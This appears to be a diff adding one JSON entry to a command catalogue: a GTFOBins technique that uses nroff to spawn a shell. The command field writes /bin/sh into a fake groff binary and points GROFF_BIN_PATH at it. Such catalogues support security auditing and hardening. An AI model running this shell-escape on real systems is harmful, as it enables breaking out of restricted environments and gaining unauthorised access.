@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-nroff-shell",
+  "name": "GTFOBins · nroff (shell)",
+  "command": "echo /bin/sh >groff\nchmod +x groff\nGROFF_BIN_PATH=. nroff",
+  "description": "Use nroff to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "nroff",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/nroff/#shell",
+  "upstream_id": "nroff/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/nroff/"
+    }
+  ]
+}
